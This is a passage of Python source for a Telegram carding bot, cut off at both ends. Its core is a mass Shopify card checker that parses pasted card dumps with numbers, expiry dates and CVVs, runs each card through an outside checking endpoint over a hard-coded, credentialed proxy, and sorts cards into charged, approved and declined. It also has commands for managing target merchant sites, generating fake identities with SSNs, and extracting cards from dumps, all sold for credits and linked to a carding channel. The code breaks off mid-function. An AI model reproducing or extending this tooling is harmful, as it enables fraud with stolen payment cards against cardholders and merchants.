        f"────────✧────────\n"
        f"{result_text}\n"
        f"────────✧────────\n"
        f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➵ {requester}\n"
        f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➵ {developer_clickable}\n"
        f"────────✧────────"
    )

    await processing_msg.edit_text(
        final_msg,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

import asyncio
import httpx
import time
import re
import io
import logging
from typing import List, Dict
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    ContextTypes,
    CallbackQueryHandler,
)

# Replace with your actual DB functions
from db import get_user, update_user

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# In-memory cooldowns
last_msp_usage: Dict[int, float] = {}

# Regex backup matcher
CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")

# Proxy placeholder
DEFAULT_PROXY = "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"

# Junk/error response patterns
ERROR_PATTERNS = [
    "CLINTE TOKEN",
    "DEL AMMOUNT EMPTY",
    "PRODUCT ID IS EMPTY",
    "R4 TOKEN EMPTY",
    "TAX AMOUNT EMPTY"
]

# Classification keyword groups
CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED"}
APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP", "INSUFFICIENT_FUNDS"}
DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}


# ---------- Utility ----------
def extract_cards_from_text(text: str) -> List[str]:
    cards: List[str] = []
    text = text.replace(" ", "\n")
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split("|")
        if len(parts) == 4 and parts[0].isdigit():
            cards.append(line)
    if not cards:
        cards = [m.group(0) for m in CARD_REGEX.finditer(text)]
    return cards


async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        await update_user(user_id, credits=user_data["credits"] - 1)
        return True
    return False


def build_msp_buttons(approved: int, charged: int, declined: int, owner_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿: {approved}", callback_data="noop"),
            InlineKeyboardButton(f"🔥 Charged: {charged}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="noop"),
            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_id}")
        ]
    ])


# ---------- Networking ----------
async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str) -> Dict[str, str]:
    if not site.startswith("http://") and not site.startswith("https://"):
        site = "https://" + site
    url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
    try:
        r = await session.get(url, timeout=55)
        try:
            data = r.json()
        except Exception:
            return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
        return {
            "response": str(data.get("Response", "Unknown")),
            "status": str(data.get("Status", "false")),
            "price": str(data.get("Price", "0")),
            "gateway": str(data.get("Gateway", "N/A")),
        }
    except Exception as e:
        return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}


# ---------- Buttons ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query:
        return
    data = query.data or ""
    if data.startswith("stop:"):
        try:
            owner_id = int(data.split(":", 1)[1])
        except Exception:
            owner_id = None
        if query.from_user.id != owner_id:
            await query.answer("⚠️ Not your request!", show_alert=True)
            return
        # Stop only this user's process
        context.user_data["msp_stop"] = True
        await query.answer("⏹ Stopped! Sending results...", show_alert=True)
        if "msp_state" in context.user_data:
            state = context.user_data["msp_state"]
            await finalize_results(
                update,
                context,
                state["msg"],
                state["cards"],
                state["approved"],
                state["charged"],
                state["declined"],
                state["errors"],
                state["approved_results"],
                state["charged_results"],
                state["declined_results"],
                state["error_results"]
            )
        return
    await query.answer()


# ---------- Finalize ----------
async def finalize_results(update: Update, context: ContextTypes.DEFAULT_TYPE, msg, cards, approved, charged, declined, errors, approved_results, charged_results, declined_results, error_results):
    sections = []
    if approved_results:
        sections.append("✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿\n" + "\n\n".join(approved_results))
    if charged_results:
        sections.append("🔥 CHARGED\n" + "\n\n".join(charged_results))
    if declined_results:
        sections.append("❌ DECLINED\n" + "\n\n".join(declined_results))
    if error_results:
        sections.append("⚠️ ERRORS\n" + "\n\n".join(error_results))

    final_report = "\n\n============================\n\n".join(sections) if sections else "No results collected."
    file_buf = io.BytesIO(final_report.encode("utf-8"))
    file_buf.name = "shopify_results.txt"

    summary_caption = (
        "📊 <b>𝐅𝐢𝐧𝐚𝐥 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ <b>{len(cards)}</b>\n"
        "<pre><code>"
        f"✅ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ➵ <b>{approved}</b>\n"
        f"🔥 Charged ➵ <b>{charged}</b>\n"
        f"❌ Declined ➵ <b>{declined}</b>\n"
        f"⚠️ Errors ➵ <b>{errors}</b>"
        "</code></pre>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        command_msg_id = context.user_data.get("msp_command_msg_id")
        if command_msg_id:
            # ✅ always reply to the original /msp command message
            await update.effective_chat.send_document(
                document=InputFile(file_buf),
                caption=summary_caption,
                parse_mode="HTML",
                reply_to_message_id=command_msg_id
            )
        else:
            await msg.reply_document(document=InputFile(file_buf), caption=summary_caption, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Finalize send failed: {e}")
    try:
        await msg.delete()
    except Exception:
        pass


# ---------- Runner ----------
async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[str], base_url: str, sites: List[str], msg) -> None:
    context.user_data["msp_stop"] = False
    approved = declined = errors = charged = checked = 0
    approved_results, charged_results, declined_results, error_results = [], [], [], []
    proxy = DEFAULT_PROXY
    BATCH_SIZE = 3  # process 3 cards in parallel

    # Save initial state for stop/finalize
    context.user_data["msp_state"] = {
        "msg": msg,
        "cards": cards,
        "approved": approved,
        "charged": charged,
        "declined": declined,
        "errors": errors,
        "approved_results": approved_results,
        "charged_results": charged_results,
        "declined_results": declined_results,
        "error_results": error_results
    }

    async with httpx.AsyncClient() as session:
        for i in range(0, len(cards), BATCH_SIZE):
            if context.user_data.get("msp_stop"):
                return
            batch = cards[i:i + BATCH_SIZE]

            async def process_card(card: str):
                nonlocal approved, declined, errors, charged, checked
                if context.user_data.get("msp_stop"):
                    return None
                resp = None
                best_score = 0
                resp_upper = ""
                chosen_site = None
                valid_found = False

                for site in sites:
                    if context.user_data.get("msp_stop"):
                        return None
                    r = await check_card(session, base_url, site, card, proxy)
                    resp_text = (r.get("response") or "").strip()
                    resp_upper = resp_text.upper()

                    # 🚫 Skip junk/error sites
                    if any(pat in resp_upper for pat in ERROR_PATTERNS):
                        continue

                    # ✅ Found a valid site response
                    resp = r
                    chosen_site = site
                    valid_found = True

                    if any(k in resp_upper for k in CHARGED_KEYWORDS):
                        best_score = 4
                    elif any(k in resp_upper for k in APPROVED_KEYWORDS):
                        best_score = 3
                    elif any(k in resp_upper for k in DECLINED_KEYWORDS):
                        best_score = 2
                    elif "ERROR" in resp_upper or "UNKNOWN" in resp_upper:
                        best_score = 1
                    else:
                        best_score = 0
                    break  # stop at first valid site

                # ❌ No valid site worked → mark error once
                if not valid_found:
                    errors += 1
                    error_results.append(f"⚠️ {card}\n Response: All sites failed\n Price: 0\n Gateway: N/A")
                    checked += 1
                    return

                # Build line with site info
                line_resp = (
                    f"Response: {resp.get('response','Unknown')}\n"
                    f" Price: {resp.get('price','0')}\n"
                    f" Gateway: {resp.get('gateway','N/A')}\n"
                )

                # Final classification
                if "INSUFFICIENT_FUNDS" in resp_upper:
                    charged += 1
                    charged_results.append(f"🔥 {card}\n {line_resp}")
                elif best_score == 3:
                    approved += 1
                    approved_results.append(f"✅ {card}\n {line_resp}")
                elif best_score == 2:
                    declined += 1
                    declined_results.append(f"❌ {card}\n {line_resp}")
                elif best_score == 4:
                    charged += 1
                    charged_results.append(f"🔥 {card}\n {line_resp}")
                else:
                    errors += 1
                    error_results.append(f"⚠️ {card}\n {line_resp}")
                checked += 1

            # Run 3 cards in parallel
            await asyncio.gather(*(process_card(c) for c in batch))

            # update state after each batch
            context.user_data["msp_state"].update({
                "approved": approved,
                "charged": charged,
                "declined": declined,
                "errors": errors,
                "approved_results": approved_results,
                "charged_results": charged_results,
                "declined_results": declined_results,
                "error_results": error_results
            })

            # Progress update
            try:
                buttons = build_msp_buttons(approved, charged, declined, update.effective_user.id)
                summary_text = (
                    f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
                    "<pre><code>"
                    f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ {approved}\n"
                    f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ {charged}\n"
                    f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ {declined}\n"
                    f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ {errors}\n"
                    f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ {checked} / {len(cards)}\n"
                    "</code></pre>"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                )
                await msg.edit_text(summary_text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=buttons)
            except Exception as e:
                logger.warning(f"Edit failed: {e}")

    # ✅ FIXED: call finalize_results with context so results are always sent
    await finalize_results(
        update,
        context,
        msg,
        cards,
        approved,
        charged,
        declined,
        errors,
        approved_results,
        charged_results,
        declined_results,
        error_results
    )


# ---------- /msp ----------
async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    now = time.time()
    if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
        await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
        return
    last_msp_usage[user_id] = now

    cards: List[str] = []
    if context.args:
        cards = extract_cards_from_text(" ".join(context.args))
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cards = extract_cards_from_text(update.message.reply_to_message.text)
    elif update.message.reply_to_message and update.message.reply_to_message.document:
        try:
            file_obj = await update.message.reply_to_message.document.get_file()
            content = await file_obj.download_as_bytearray()
            text = content.decode("utf-8", errors="ignore")
            cards = extract_cards_from_text(text)
        except Exception:
            await update.message.reply_text("❌ Failed to read the replied document.")
            return

    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return

    if len(cards) > 100:
        cards = cards[:100]

    user_data = await get_user(user_id)
    if not user_data:
        await update.message.reply_text("❌ No user data found in DB.")
        return

    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You have no credits left.")
        return

    base_url = user_data.get("base_url", "https://autoshopify.stormx.pw/index.php")
    sites = user_data.get("custom_urls", [])
    if not sites:
        await update.message.reply_text("❌ No sites found in your account.")
        return

    context.user_data["msp_command_msg_id"] = update.message.message_id

    initial_summary = (
        f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
        "<pre><code>"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ 0\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ 0\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ 0\n"
        f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ 0\n"
        f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ 0 / {len(cards)}\n"
        "</code></pre>"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    buttons = build_msp_buttons(0, 0, 0, update.effective_user.id)
    msg = await update.message.reply_text(initial_summary, parse_mode="HTML", disable_web_page_preview=True, reply_markup=buttons)

    task = asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg))
    task.add_done_callback(lambda t: logger.error(f"/msp crashed: {t.exception()}") if t.exception() else None)





import asyncio
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from db import get_user, update_user

# /removeall command with confirmation
async def removeall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Get user's current sites
    user_data = await get_user(user_id)
    current_sites = user_data.get("custom_urls", [])
    
    if not current_sites:
        await update.message.reply_text(
            "❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚!",
            parse_mode=ParseMode.HTML
        )
        return

    # Create confirmation buttons with stylish fonts
    keyboard = [
        [
            InlineKeyboardButton("✅ 𝙔𝙚𝙨, 𝙍𝙚𝙢𝙤𝙫𝙚 𝘼𝙡𝙡", callback_data=f"removeall_confirm_{user_id}"),
            InlineKeyboardButton("❌ 𝙉𝙤, 𝙆𝙚𝙚𝙥 𝙎𝙞𝙩𝙚𝙨", callback_data=f"removeall_cancel_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    confirmation_text = (
        "⚠️ 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝙍𝙀𝙌𝙐𝙄𝙍𝙀𝘿 ⚠️\n\n"
        f"👀 𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨: {len(current_sites)}\n"
        f"💎 𝙏𝙝𝙞𝙨 𝙖𝙘𝙩𝙞𝙤𝙣 𝙘𝙖𝙣𝙣𝙤𝙩 𝙗𝙚 𝙪𝙣𝙙𝙤𝙣𝙚!\n\n"
        "𝙋𝙧𝙚𝙨𝙨 ✅ 𝙔𝙚𝙨 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝘼𝙇𝙇 𝙮𝙤𝙪𝙧 𝙨𝙞𝙩𝙚𝙨 𝙤𝙧 ❌ 𝙉𝙤 𝙩𝙤 𝙘𝙖𝙣𝙘𝙚𝙡."
    )

    await update.message.reply_text(
        confirmation_text,
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

# ------------------ REMOVEALL CALLBACK HANDLER ------------------
async def handle_removeall_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    logger.info(f"Removeall callback: {query.data} from user {user_id}")

    try:
        if query.data.startswith("removeall_confirm_"):
            # Extract the target user ID from callback data
            target_user_id = int(query.data.split("_")[2])
            
            # Security check - only the user who initiated can confirm
            if user_id != target_user_id:
                await query.edit_message_text(
                    "❌ 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙥𝙚𝙧𝙛𝙤𝙧𝙢 𝙩𝙝𝙞𝙨 𝙖𝙘𝙩𝙞𝙤𝙣!",
                    parse_mode=ParseMode.HTML
                )
                return
            
            # Remove all sites
            await update_user(target_user_id, custom_urls=[])
            
            await query.edit_message_text(
                "✅ 𝙎𝙐𝘾𝘾𝙀𝙎𝙎! 𝘼𝙡𝙡 𝙮𝙤𝙪𝙧 𝙨𝙞𝙩𝙚𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!",
                parse_mode=ParseMode.HTML
            )
            
        elif query.data.startswith("removeall_cancel_"):
            target_user_id = int(query.data.split("_")[2])
            
            if user_id != target_user_id:
                await query.edit_message_text(
                    "❌ 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙖𝙘𝙘𝙚𝙨𝙨!",
                    parse_mode=ParseMode.HTML
                )
                return
                
            await query.edit_message_text(
                "❌ 𝘾𝘼𝙉𝘾𝙀𝙇𝙀𝘿! 𝙔𝙤𝙪𝙧 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙨𝙖𝙛𝙚.",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        logger.error(f"Error in removeall callback: {e}")
        await query.edit_message_text(
            "❌ 𝙀𝙍𝙍𝙊𝙍! 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙮𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩.",
            parse_mode=ParseMode.HTML
        )



import asyncio
import aiohttp
import json
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user, update_user

# ===== /adurls command FIXED =====
async def adurls_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # --- Usage check ---
    if not context.args:
        return await update.message.reply_text(
            "❌ 𝙐𝙨𝙖𝙜𝙚:\n<code>/adurls &lt;site1&gt; &lt;site2&gt; ...</code>\n"
            "⚠️ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 20 𝙨𝙞𝙩𝙚𝙨 𝙥𝙚𝙧 𝙪𝙨𝙚𝙧.",
            parse_mode=ParseMode.HTML
        )

    # --- Clean and normalize URLs ---
    sites_to_add_initial = []
    for site in context.args:
        site = site.strip()
        if site:
            if not site.startswith("http://") and not site.startswith("https://"):
                site = "https://" + site
            sites_to_add_initial.append(site)

    if not sites_to_add_initial:
        return await update.message.reply_text(
            "❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙨𝙞𝙩𝙚 𝙐𝙍𝙇𝙨 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙.",
            parse_mode=ParseMode.HTML
        )

    # --- Initial processing message ---
    processing_msg = await update.message.reply_text(
        f"⏳ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙨𝙞𝙩𝙚𝙨…\n<code>{escape(' '.join(sites_to_add_initial[:3]))}</code>",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    async def add_urls_bg(sites_to_add):
        try:
            user_data = await get_user(user_id)
            if not user_data:
                await processing_msg.edit_text(
                    "❌ 𝙐𝙨𝙚𝙧 𝙙𝙖𝙩𝙖 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙.",
                    parse_mode=ParseMode.HTML
                )
                return

            # --- Credit check ---
            credits = user_data.get("credits", 0)
            if credits < 1:
                await processing_msg.edit_text(
                    "❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙣𝙤 𝙘𝙧𝙚𝙙𝙞𝙩𝙨 𝙡𝙚𝙛𝙩.",
                    parse_mode=ParseMode.HTML
                )
                return

            # --- Current sites ---
            current_sites = user_data.get("custom_urls", [])

            # --- Filter out duplicates ---
            new_sites = [site for site in sites_to_add if site not in current_sites]

            if not new_sites:
                await processing_msg.edit_text(
                    "⚠️ 𝘼𝙡𝙡 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙖𝙙𝙙𝙚𝙙.",
                    parse_mode=ParseMode.HTML
                )
                return

            # --- Max 20 sites logic ---
            allowed_to_add = 20 - len(current_sites)
            if allowed_to_add <= 0:
                await processing_msg.edit_text(
                    "⚠️ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 20 𝙨𝙞𝙩𝙚𝙨. 𝙍𝙚𝙢𝙤𝙫𝙚 𝙨𝙤𝙢𝙚 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜 /rsite 𝙤𝙧 /removeall.",
                    parse_mode=ParseMode.HTML
                )
                return

            if len(new_sites) > allowed_to_add:
                new_sites = new_sites[:allowed_to_add]
                await processing_msg.edit_text(
                    f"⚠️ 𝙊𝙣𝙡𝙮 {allowed_to_add} 𝙨𝙞𝙩𝙚(𝙨) 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙖𝙙𝙙𝙚𝙙 𝙩𝙤 𝙧𝙚𝙨𝙥𝙚𝙘𝙩 𝙩𝙝𝙚 20-𝙨𝙞𝙩𝙚𝙨 𝙡𝙞𝙢𝙞𝙩.",
                    parse_mode=ParseMode.HTML
                )
                await asyncio.sleep(2)

            # --- Consume 1 credit ---
            await update_user(user_id, credits=credits - 1)

            # --- Add new sites ---
            updated_sites = current_sites + new_sites
            await update_user(user_id, custom_urls=updated_sites)

            # --- Final stylish message ---
            final_msg = (
                f"✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙖𝙙𝙙𝙚𝙙 {len(new_sites)} 𝙨𝙞𝙩𝙚(𝙨)!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨: {len(updated_sites)} / 20\n"
                f"💲 𝘾𝙧𝙚𝙙𝙞𝙩 𝙐𝙨𝙚𝙙: 1\n"
                f"🔗 𝙇𝙖𝙨𝙩 𝘼𝙙𝙙𝙚𝙙: <code>{escape(new_sites[0])}</code>"
            )

            await processing_msg.edit_text(final_msg, parse_mode=ParseMode.HTML)

        except Exception as e:
            await processing_msg.edit_text(
                f"❌ 𝘼𝙣 𝙚𝙧𝙧𝙤𝙧 𝙤𝙘𝙘𝙪𝙧𝙧𝙚𝙙:\n<code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )

    # --- Run in background ---
    asyncio.create_task(add_urls_bg(sites_to_add_initial))


async def rsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a specific site from user's custom URLs"""
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: <code>/rsite &lt;site_url&gt;</code>\n"
            "Example: <code>/rsite https://example.com</code>\n\n"
            "Use <code>/mysites</code> to see your current sites.",
            parse_mode=ParseMode.HTML
        )
        return

    site_to_remove = context.args[0].strip()
    
    # Normalize the URL
    if not site_to_remove.startswith(("http://", "https://")):
        site_to_remove = "https://" + site_to_remove

    try:
        # Get user data
        user_data = await get_user(user_id)
        if not user_data:
            await update.message.reply_text("❌ User data not found.")
            return

        # Get current sites or empty list
        current_sites = user_data.get('custom_urls', [])
        
        if not current_sites:
            await update.message.reply_text("❌ You don't have any sites to remove.")
            return

        # Check if site exists
        if site_to_remove not in current_sites:
            await update.message.reply_text(
                f"❌ Site not found in your list:\n<code>{site_to_remove}</code>\n\n"
                f"Use <code>/mysites</code> to see your current sites.",
                parse_mode=ParseMode.HTML
            )
            return

        # Remove the site
        updated_sites = [site for site in current_sites if site != site_to_remove]
        
        # Update database
        success = await update_user(user_id, custom_urls=updated_sites)
        
        if success:
            await update.message.reply_text(
                f"✅ Site removed successfully!\n\n"
                f"🗑️ <b>Removed:</b> <code>{site_to_remove}</code>\n"
                f"📊 <b>Total sites now:</b> {len(updated_sites)}",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text("❌ Failed to update database.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
        
  
async def removeall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove all sites from user's custom URLs"""
    user_id = update.effective_user.id

    try:
        # Get user data
        user_data = await get_user(user_id)
        if not user_data:
            await update.message.reply_text("❌ User data not found.")
            return

        # Get current sites
        current_sites = user_data.get('custom_urls', [])
        
        if not current_sites:
            await update.message.reply_text("❌ You don't have any sites to remove.")
            return

        # Update database with empty list
        success = await update_user(user_id, custom_urls=[])
        
        if success:
            await update.message.reply_text(
                f"✅ All sites removed successfully!\n\n"
                f"🗑️ <b>Removed:</b> {len(current_sites)} sites\n"
                f"📊 <b>Total sites now:</b> 0",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text("❌ Failed to update database.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")              




from faker import Faker
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "tg://resolve?domain=BlinkCarder"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\(\)~`>#+\-=|{}.!\\])', r'\\\1', str(text))
    # Notice: [ and ] are NOT escaped

async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates fake identity info."""

    # Cooldown check
    if not await enforce_cooldown(update.effective_user.id, update):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Deduct 1 credit if available
    if user_data['credits'] <= 0 or not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    country_code = context.args[0] if context.args else 'en_US'
    try:
        fake = Faker(country_code)
    except:
        fake = Faker('en_US')

    # Generate and escape values
    name = escape_markdown_v2(fake.name())
    dob = escape_markdown_v2(fake.date_of_birth().strftime('%Y-%m-%d'))
    ssn = escape_markdown_v2(fake.ssn())
    email = escape_markdown_v2(fake.email())
    username = escape_markdown_v2(fake.user_name())
    phone = escape_markdown_v2(fake.phone_number())
    job = escape_markdown_v2(fake.job())
    company = escape_markdown_v2(fake.company())
    street = escape_markdown_v2(fake.street_address())
    address2 = escape_markdown_v2(fake.secondary_address())
    city = escape_markdown_v2(fake.city())
    state = escape_markdown_v2(fake.state())
    zip_code = escape_markdown_v2(fake.zipcode())
    country = escape_markdown_v2(fake.country())
    ip = escape_markdown_v2(fake.ipv4_public())
    ua = escape_markdown_v2(fake.user_agent())

    # Only escape the content inside the brackets, keep brackets literal
    bullet_text = "⩙"   # Yeh change karo  # Escaped so [] stay visible in MarkdownV2
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"


    output = (
        "━━━[ 🧑‍💻 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤 ]━\n"
        f"{bullet_link} 𝙉𝙖𝙢𝙚 ➳ `{name}`\n"
        f"{bullet_link} 𝘿𝙤𝘽 ➳ `{dob}`\n"
        f"{bullet_link} 𝙎𝙎𝙉 ➳ `{ssn}`\n"
        f"{bullet_link} 𝙀𝙢𝙖𝙞𝙡 ➳ `{email}`\n"
        f"{bullet_link} 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➳ `{username}`\n"
        f"{bullet_link} 𝙋𝙝𝙤𝙣𝙚 ➳ `{phone}`\n"
        f"{bullet_link} 𝙅𝙤𝙗 ➳ `{job}`\n"
        f"{bullet_link} 𝘾𝙤𝙢𝙥𝙖𝙣𝙮 ➳ `{company}`\n"
        f"{bullet_link} 𝙎𝙩𝙧𝙚𝙚𝙩 ➳ `{street}`\n"
        f"{bullet_link} 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 2 ➳ `{address2}`\n"
        f"{bullet_link} 𝘾𝙞𝙩𝙮 ➳ `{city}`\n"
        f"{bullet_link} 𝙎𝙩𝙖𝙩𝙚 ➳ `{state}`\n"
        f"{bullet_link} 𝙕𝙞𝙥 ➳ `{zip_code}`\n"
        f"{bullet_link} 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ `{country}`\n"
        f"{bullet_link} 𝙄𝙋 ➳ `{ip}`\n"
        f"{bullet_link} 𝙐𝘼 ➳ `{ua}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    await update.effective_message.reply_text(
        output,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )





import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extracts all cards from a dump (message or reply)."""

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Check credits
    if user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Determine input text
    if update.message.reply_to_message and update.message.reply_to_message.text:
        dump = update.message.reply_to_message.text
    elif context.args:
        dump = " ".join(context.args)
    else:
        return await update.effective_message.reply_text(
